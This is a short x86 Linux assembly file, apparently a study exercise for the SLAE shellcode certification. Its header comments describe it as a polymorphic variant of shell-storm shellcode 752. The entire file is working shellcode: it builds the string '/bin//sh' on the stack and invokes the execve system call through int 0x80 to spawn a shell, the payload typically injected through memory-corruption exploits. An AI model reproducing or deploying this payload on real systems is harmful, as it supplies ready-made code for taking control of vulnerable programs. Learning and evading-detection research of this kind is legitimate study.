; http://shell-storm.org/shellcode/files/shellcode-752.php
; Polymorphic version modified by @davidlebr1 for SLAE certification - 30 bytes

global _start

_start:
  xor eax, eax
  xor ecx, ecx
  push eax
  mov dword [esp-4], 0x68732f2f
  mov dword [esp-8], 0x6e69622f
  sub esp, 8
  mov ebx, esp
  mov al, 11
  int 0x80
